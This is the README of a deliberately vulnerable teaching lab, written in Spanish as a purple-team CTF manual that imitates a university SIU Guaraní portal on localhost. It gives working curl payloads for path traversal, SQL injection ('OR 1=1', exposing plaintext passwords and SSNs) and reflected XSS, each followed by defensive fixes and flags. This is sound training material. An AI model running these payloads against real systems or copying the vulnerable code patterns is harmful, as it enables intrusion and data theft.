```text
  ___ ___  ___   ___ ___ ___ _____ _   _    __  __   _   _  _ _   _  _   _    
 | __/ __|/ _ \ / __|_ _| __|_   _| | | |  |  \/  | /_\ | \| | | | |/_\ | |   
 | _|\__ \ (_) | (__ | || _|  | | \   /   | |\/| |/ _ \| .` | |_| / _ \| |__ 
 |_| |___/\___/ \___|___|___| |_|  |_|    |_|  |_/_/ \_\_|\_|\___/_/ \_\____|
```

# `[ OP_GUARANI // PURPLE TEAM ]` — Manual de Laboratorio UNSL

> *"Hello, friend. Estás frente al portal `g3.unsl.edu.ar` (SIU Guaraní). No tienes credenciales válidas, pero toda gran intrusión empieza observando lo que el servidor deja abierto por descuido."*

---

## `00 // INITIALIZING_ENVIRONMENT`

### Requisitos de Estación
- **JDK 17+** y **Maven Wrapper (`./mvnw`)** (o **Docker Engine + Docker Compose v2**).
- Navegador web moderno y terminal (`curl`).

### Despliegue Rápido
```bash
# Opción 1: Ejecución nativa
./mvnw spring-boot:run

# Opción 2: Docker Compose
docker compose up --build -d
```
Accede al portal objetivo en: `http://localhost:8080`  
Ejecuta la suite de pruebas automatizadas:
```bash
./mvnw test
```

---

## `01 // CWE-22: PATH_TRAVERSAL (Validador de Certificados)`

### Briefing de la Misión
En la pestaña **Validador de Certificados**, el SIU permite descargar normativas y constancias públicas mediante:
```http
GET /api/files/download?filename=politica_seguridad.txt
```
En `FileController.java`, el backend concatena el nombre directamente con `new File(publicRoot.toFile(), filename)` sin normalizar ni verificar límites canónicos.

### Fase Red Team — Escape de Directorio
1. Escapa del directorio `/storage/public/` usando secuencias relativas `../` para leer el archivo confidencial del servidor:
   ```bash
   curl -i "http://localhost:8080/api/files/download?filename=../confidential/flag.txt&mode=vuln"
   ```
2. **Inteligencia Extraída (Lo que revela el archivo)**:
   - **Versión de Base de Datos**: `H2 In-Memory Database Engine v2.2.224` y estructura de la tabla `users` (`id, username, password, role, ssn`).
   - **Fecha de Última Modificación**: `2026-03-12 14:32:00 UTC`.
   - **Pista SQLi**: `/api/users/search?username=` usa `Statement.executeQuery()` sin parametrizar.
   - **Pista XSS**: `/api/profile/greet?name=` no implementa `Encode.forHtml()` ni `Content-Security-Policy`.
   - **Bandera CTF**: `FLAG{UNSL_PURPLE_TEAM_PATH_TRAVERSAL_MASTERED_2026}`.

### Fase Blue Team — Contención (`mode=safe`)
Se aplica normalización canónica con `java.nio.file.Path`:
```java
Path baseDir = getStorageRoot().resolve("public").toAbsolutePath().normalize();
Path targetPath = baseDir.resolve(filename).normalize();
if (!targetPath.startsWith(baseDir)) {
    return ResponseEntity.status(HttpStatus.FORBIDDEN).body(...);
}
```
- **Bandera Blue Team**: `FLAG{UNSL_CANONICAL_PATH_BOUNDARY_2026}`.

---

## `02 // CWE-89: SQL_INJECTION (Acceso al SIU — /api/users/search)`

### Briefing de la Misión
Con la estructura de la tabla `users` filtrada en la Fase 01, el estudiante se dirige a **Acceso** (`Ingreso para Estudiantes`) y apunta al buscador del directorio `/api/users/search`.

### Fase Red Team — Alteración del AST SQL
La consulta vulnerable interpola el input directamente:
```sql
SELECT id, username, password, role, ssn FROM users WHERE username = '<ENTRADA>'
```
Inyecta el operador booleano clásico para forzar evaluación `TRUE` en toda la tabla:
```bash
curl -s "http://localhost:8080/api/users/search?username=%27%20OR%20%271%27=%271&mode=vuln"
```
- **Impacto**: Se exponen las 5 cuentas del sistema (`admin_sec`, `agomez`, `mrodriguez`, `clopez`, `auditor_interno`) con sus contraseñas en texto plano y DNI/SSN.
- **Bandera CTF**: `FLAG{UNSL_SQLI_AUTH_BYPASS_2026}`.

### Fase Blue Team — Contención (`mode=safe`)
Separación estricta de planos de control y datos mediante `PreparedStatement` + principio de mínimo privilegio (sin proyectar `password` ni `ssn`):
```java
String sqlSafe = "SELECT id, username, role FROM users WHERE username = ?";
PreparedStatement pstmt = conn.prepareStatement(sqlSafe);
pstmt.setString(1, username);
```
- **Bandera Blue Team**: `FLAG{UNSL_PREPARED_STATEMENT_DEFENDER_2026}`.

---

## `03 // CWE-79: XSS_REFLECTED_&_STORED (Mi Perfil — /api/profile)`

### Briefing de la Misión
Ya autenticado dentro del SIU, utilizas el segundo indicio descubierto en `flag.txt`: el módulo de perfil refleja el parámetro `name` sin escape contextual ni cabecera CSP.

### Fase Red Team — Ejecución en el DOM
1. **XSS Reflejado (`/api/profile/greet`)**:
   ```bash
   curl -i "http://localhost:8080/api/profile/greet?name=%3Cimg%20src%3Dx%20onerror%3D%22alert(%27XSS_UNSL%27)%22%3E&mode=vuln"
   ```
   - **Bandera CTF**: `FLAG{UNSL_XSS_DOM_INJECTION_ALERT_2026}`.
2. **XSS Almacenado (`Mi Perfil -> Notas en Historia Académica`)**:
   - Inyecta una etiqueta HTML en el muro de observaciones; en modo vulnerable se renderiza vía `innerHTML`, ejecutándose cada vez que un docente o bedelía abre el perfil.

### Fase Blue Team — Contención (`mode=safe`)
1. Codificación contextual con **OWASP Java Encoder**: `Encode.forHtml(name)` (y `textContent` en el DOM del cliente).
2. Defensa en profundidad mediante cabecera HTTP:
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'none'; object-src 'none';
   X-Content-Type-Options: nosniff
   ```
- **Bandera Blue Team**: `FLAG{UNSL_CSP_CONTEXTUAL_ENCODING_2026}`.

---

```text
root@fsociety:~# ./verify_all_defenses.sh
> ./mvnw test -Dtest=CiberlabSecurityTests
[OK] 8/8 Purple Team assertions passed.
```
